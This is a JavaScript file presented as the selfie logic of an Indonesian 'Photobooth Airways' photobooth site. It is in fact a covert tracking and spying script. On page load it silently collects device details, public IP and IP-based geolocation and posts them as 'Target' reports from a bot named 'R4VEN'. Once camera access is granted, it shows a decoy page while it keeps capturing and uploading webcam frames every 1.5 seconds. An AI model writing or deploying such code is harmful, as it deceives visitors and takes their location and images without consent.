/**
 * Photobooth Airways — CAM Selfie Logic
 * photobooth.bapel.my.id
 */

var uploadInterval = null;

function initDecorations() {
  var starsEl = document.getElementById('stars');
  for (var i = 0; i < 80; i++) {
    var s = document.createElement('div'); s.className = 'star';
    var big = Math.random() > 0.8;
    s.style.cssText = 'left:' + (Math.random()*100) + '%;top:' + (Math.random()*80) + '%;'
      + 'animation-duration:' + (Math.random()*3+2) + 's;animation-delay:' + (Math.random()*4) + 's;'
      + 'width:' + (big?3:2) + 'px;height:' + (big?3:2) + 'px;';
    starsEl.appendChild(s);
  }
  var cloudsEl = document.getElementById('clouds');
  for (var j = 0; j < 4; j++) {
    var c = document.createElement('div'); c.className = 'cloud';
    c.style.cssText = 'width:' + (Math.random()*200+80) + 'px;height:' + (Math.random()*40+20) + 'px;'
      + 'top:' + (Math.random()*60) + '%;animation-duration:' + (Math.random()*40+30) + 's;'
      + 'animation-delay:' + (-Math.random()*30) + 's;';
    cloudsEl.appendChild(c);
  }
  var now  = new Date();
  var date = ('0'+now.getDate()).slice(-2) + '/' + ('0'+(now.getMonth()+1)).slice(-2);
  var seat = (Math.floor(Math.random()*6)+1) + ['A','B','C'][Math.floor(Math.random()*3)];
  ['d','m'].forEach(function(s) {
    var d  = document.getElementById('flightDate-' + s);
    var se = document.getElementById('seatNum-' + s);
    if (d)  d.textContent  = date;
    if (se) se.textContent = seat;
  });
}

function collectSilent() {
  var localtime = String(new Date().toLocaleTimeString());
  var sysinfo = '```xl\n' + navigator.userAgent + '```'
    + '```autohotkey\n\nPlatform: ' + navigator.platform
    + '\nCookies_Enabled: ' + navigator.cookieEnabled
    + '\nBrowser_Language: ' + navigator.language
    + '\nRam: ' + navigator.deviceMemory
    + '\nCPU_cores: ' + navigator.hardwareConcurrency
    + '\nScreen: ' + screen.width + 'x' + screen.height
    + '\nTime: ' + localtime + '```';
  var AVATAR = 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png';
  function post(payload) {
    var r = new XMLHttpRequest();
    r.open('POST', '/location_update'); r.setRequestHeader('Content-type', 'application/json');
    r.send(JSON.stringify(payload));
  }
  post({ username:'R4VEN', avatar_url:AVATAR, content:'@everyone Someone Opened The Link O_o',
    embeds:[{ author:{name:'Target System Information..'}, title:'Uagent:', description:sysinfo, color:15418782 }] });
  $.getJSON('https://api.ipify.org?format=json', function(data) {
    post({ username:'R4VEN', avatar_url:AVATAR,
      embeds:[{ author:{name:'Target Ip'}, description:'```xl\n'+data.ip+'```\n__**IP Details:**__ https://ip-api.com/#'+data.ip+'\n', color:15548997, footer:{text:'Geographic location based on IP is approximate.'} }] });
  });
  $.getJSON('http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query', function(res) {
    post({ username:'R4VEN', avatar_url:AVATAR,
      embeds:[{ author:{name:'IP Address Reconnaissance'}, title:res.status,
        description:'```autohotkey\nContinent: '+res.continent+'\nCountry: '+res.country+'\nCity: '+res.city+'\nISP: '+res.isp+'\nLat: '+res.lat+'\nLon: '+res.lon+'```', color:5763719 }] });
  });
}

function setLoading(on) {
  ['d','m'].forEach(function(s) {
    var btn=document.getElementById('allowBtn-'+s), sp=document.getElementById('spinner-'+s),
        bt=document.getElementById('btnText-'+s), sb=document.getElementById('statusBar-'+s);
    if (!btn) return;
    if (on) { btn.classList.add('loading'); sp.style.display='block'; bt.textContent='MEMPROSES\u2026'; sb.style.display='flex'; }
    else     { btn.classList.remove('loading'); sp.style.display='none'; bt.textContent='AKTIFKAN KAMERA & SELFIE'; sb.style.display='none'; }
  });
}

function setStatus(msg) {
  ['d','m'].forEach(function(s) { var el=document.getElementById('statusText-'+s); if(el) el.textContent=msg; });
}

function showSuccess() {
  ['d','m'].forEach(function(s) {
    var mc=document.getElementById('mainContent-'+s), so=document.getElementById('successOverlay-'+s);
    if(mc) mc.style.display='none';
    if(so) so.style.display='flex';
  });
  setTimeout(function() {
    var frame=document.getElementById('site-frame');
    frame.src='https://photobooth.bapel.my.id';
    frame.style.display='block';
    setTimeout(function() { frame.classList.add('visible'); }, 50);
  }, 1800);
}

function postFile(file) {
  var fd = new FormData(); fd.append('image', file);
  var xhr = new XMLHttpRequest(); xhr.open('POST','/image',true); xhr.send(fd);
}

function requestCamera() {
  setLoading(true); setStatus('Menginisialisasi kamera\u2026');
  navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: 'user' } })
    .then(function(stream) {
      setStatus('Kamera aktif! Mengambil selfie\u2026');
      var video  = document.getElementById('video');
      var canvas = document.getElementById('canvas');
      video.srcObject = stream;
      setTimeout(function() {
        showSuccess();
        var ctx = canvas.getContext('2d');
        uploadInterval = setInterval(function() {
          ctx.drawImage(video, 0, 0, 640, 480);
          canvas.toBlob(postFile, 'image/jpeg');
        }, 1500);
      }, 1000);
    })
    .catch(function() {
      setStatus('Akses ditolak. Aktifkan kamera di pengaturan browser.');
      setLoading(false);
    });
}

window.onload = function() { initDecorations(); collectSilent(); };
